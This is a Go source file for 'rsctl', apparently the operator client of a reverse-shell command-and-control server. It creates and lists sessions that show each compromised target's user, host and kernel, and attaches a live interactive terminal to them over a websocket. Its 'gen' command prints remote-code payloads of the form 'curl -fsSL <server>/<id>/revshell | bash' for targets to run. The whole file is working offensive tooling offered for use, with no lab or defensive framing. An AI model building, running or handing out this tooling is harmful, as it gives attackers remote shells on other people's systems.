package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"text/tabwriter"

	"github.com/spf13/cobra"
	"golang.org/x/sys/unix"
	"nhooyr.io/websocket"
)

var (
	serverURL string
	token     string
)

func main() {
	defaultServer, defaultToken := resolveConfig("", "")

	root := &cobra.Command{
		Use:   "rsctl",
		Short: "rsd operator CLI",
		PersistentPreRun: func(cmd *cobra.Command, args []string) {
			serverURL, token = resolveConfig(serverURL, token)
		},
	}

	root.PersistentFlags().StringVarP(&serverURL, "server", "s", defaultServer, "rsd server URL")
	root.PersistentFlags().StringVarP(&token, "token", "t", defaultToken, "bearer token")

	root.AddCommand(loginCmd(), newCmd(), listCmd(), attachCmd(), killCmd(), genCmd())
	if err := root.Execute(); err != nil {
		os.Exit(1)
	}
}

type sessionTargetLine struct {
	userHost string
	osKernel string
}

func formatSessionTarget(s map[string]any) sessionTargetLine {
	lt, _ := s["last_target"].(map[string]any)
	if lt == nil {
		return sessionTargetLine{"—", "—"}
	}
	user, _ := lt["user"].(string)
	host, _ := lt["host"].(string)
	uh := strings.TrimSpace(user + "@" + host)
	if uh == "@" {
		uh = "—"
	}
	sys, _ := lt["system"].(map[string]any)
	osName, _ := sys["os_name"].(string)
	kernel, _ := sys["kernel"].(string)
	if osName == "" {
		osName, _ = lt["os"].(string)
	}
	ok := strings.TrimSpace(osName)
	if kernel != "" {
		ok = strings.TrimSpace(ok + " " + kernel)
	}
	if ok == "" {
		ok = "—"
	}
	return sessionTargetLine{uh, ok}
}

func loginCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "login <server> <token>",
		Short: "Save server and token to ~/.rsctl",
		Args:  cobra.ExactArgs(2),
		RunE: func(cmd *cobra.Command, args []string) error {
			srv := strings.TrimRight(strings.TrimSpace(args[0]), "/")
			tok := strings.TrimSpace(args[1])
			if srv == "" || tok == "" {
				return fmt.Errorf("server and token required")
			}
			if err := saveFileConfig(srv, tok); err != nil {
				return err
			}
			serverURL, token = srv, tok
			if err := checkAuth(); err != nil {
				return err
			}
			fmt.Printf("saved %s\n", configPath())
			fmt.Println("rsctl list")
			return nil
		},
	}
}

func checkAuth() error {
	if token == "" {
		return fmt.Errorf("no token — run: rsctl login <server> <token>")
	}
	resp, err := apiReq("GET", "/api/workspace/sessions", nil)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("auth failed (HTTP %d)", resp.StatusCode)
	}
	return nil
}

func apiReq(method, path string, body io.Reader) (*http.Response, error) {
	if token == "" {
		return nil, fmt.Errorf("no token — run: rsctl login <server> <token>")
	}
	url := strings.TrimRight(serverURL, "/") + path
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+token)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	return http.DefaultClient.Do(req)
}

func newCmd() *cobra.Command {
	var name string
	cmd := &cobra.Command{
		Use:   "new",
		Short: "Create a new session",
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := checkAuth(); err != nil {
				return err
			}
			payload, _ := json.Marshal(map[string]string{"name": name})
			resp, err := apiReq("POST", "/api/workspace/sessions", bytes.NewReader(payload))
			if err != nil {
				return err
			}
			defer resp.Body.Close()
			if resp.StatusCode != 200 {
				b, _ := io.ReadAll(resp.Body)
				return fmt.Errorf("server: %s", b)
			}
			var result map[string]string
			json.NewDecoder(resp.Body).Decode(&result)

			fmt.Printf("Session:  %s\n", result["id"])
			fmt.Printf("Browser:  %s\n", result["browser_url"])
			fmt.Printf("Callback: %s\n", result["callback_sh"])
			fmt.Printf("Attach:   rsctl attach %s\n", result["id"])
			return nil
		},
	}
	cmd.Flags().StringVarP(&name, "name", "n", "", "session name")
	return cmd
}

func listCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "list",
		Short: "List sessions",
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := checkAuth(); err != nil {
				return err
			}
			resp, err := apiReq("GET", "/api/workspace/sessions", nil)
			if err != nil {
				return err
			}
			defer resp.Body.Close()
			var sessions []map[string]any
			json.NewDecoder(resp.Body).Decode(&sessions)

			w := tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', 0)
			fmt.Fprintf(w, "ID\tSTATE\tTARGET\tOS / KERNEL\n")
			for _, s := range sessions {
				target := formatSessionTarget(s)
				fmt.Fprintf(w, "%s\t%s\t%s\t%s\n",
					s["id"], s["state"], target.userHost, target.osKernel)
			}
			w.Flush()
			return nil
		},
	}
}

func attachCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "attach <session-id>",
		Short: "Attach to a session (interactive terminal)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := checkAuth(); err != nil {
				return err
			}
			return doAttach(args[0])
		},
	}
}

func doAttach(sessionID string) error {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	wsURL := strings.TrimRight(serverURL, "/") + "/" + sessionID + "/attach"
	wsURL = strings.Replace(wsURL, "http://", "ws://", 1)
	wsURL = strings.Replace(wsURL, "https://", "wss://", 1)

	headers := http.Header{}
	headers.Set("Authorization", "Bearer "+token)

	conn, _, err := websocket.Dial(ctx, wsURL, &websocket.DialOptions{
		HTTPHeader: headers,
	})
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	oldState, err := makeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return fmt.Errorf("raw mode: %w", err)
	}
	defer restore(int(os.Stdin.Fd()), oldState)

	wsClosed := make(chan struct{})
	go func() {
		defer close(wsClosed)
		for {
			_, data, err := conn.Read(ctx)
			if err != nil {
				return
			}
			os.Stdout.Write(data)
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			n, err := os.Stdin.Read(buf)
			if err != nil {
				cancel()
				return
			}
			if err := conn.Write(ctx, websocket.MessageBinary, buf[:n]); err != nil {
				cancel()
				return
			}
		}
	}()

	select {
	case <-ctx.Done():
	case <-wsClosed:
		fmt.Fprintln(os.Stderr, "\n[session ended]")
	}
	return nil
}

func killCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "kill <session-id>",
		Short: "Kill a session",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := checkAuth(); err != nil {
				return err
			}
			resp, err := apiReq("DELETE", "/api/workspace/sessions/"+args[0], nil)
			if err != nil {
				return err
			}
			resp.Body.Close()
			if resp.StatusCode == 204 {
				fmt.Println("killed")
			} else {
				return fmt.Errorf("status: %d", resp.StatusCode)
			}
			return nil
		},
	}
}

func genCmd() *cobra.Command {
	var shimType string
	cmd := &cobra.Command{
		Use:   "gen <session-id>",
		Short: "Generate callback payload",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := checkAuth(); err != nil {
				return err
			}
			id := args[0]
			var callback string
			switch shimType {
			case "sh", "":
				callback = fmt.Sprintf("curl -fsSL %s/%s/revshell | bash", strings.TrimRight(serverURL, "/"), id)
			case "nopty":
				callback = fmt.Sprintf("curl -fsSL %s/%s/nopty | bash", strings.TrimRight(serverURL, "/"), id)
			default:
				return fmt.Errorf("unknown type %q (use sh or nopty)", shimType)
			}
			fmt.Println(callback)
			return nil
		},
	}
	cmd.Flags().StringVar(&shimType, "type", "sh", "payload type: sh, nopty")
	return cmd
}

type termState struct {
	termios unix.Termios
}

func makeRaw(fd int) (*termState, error) {
	termios, err := unix.IoctlGetTermios(fd, unix.TIOCGETA)
	if err != nil {
		return nil, err
	}
	old := &termState{termios: *termios}

	termios.Iflag &^= unix.IGNBRK | unix.BRKINT | unix.PARMRK | unix.ISTRIP | unix.INLCR | unix.IGNCR | unix.ICRNL | unix.IXON
	termios.Oflag &^= unix.OPOST
	termios.Lflag &^= unix.ECHO | unix.ECHONL | unix.ICANON | unix.ISIG | unix.IEXTEN
	termios.Cflag &^= unix.CSIZE | unix.PARENB
	termios.Cflag |= unix.CS8
	termios.Cc[unix.VMIN] = 1
	termios.Cc[unix.VTIME] = 0

	if err := unix.IoctlSetTermios(fd, unix.TIOCSETA, termios); err != nil {
		return nil, err
	}
	return old, nil
}

func restore(fd int, state *termState) {
	unix.IoctlSetTermios(fd, unix.TIOCSETA, &state.termios)
}
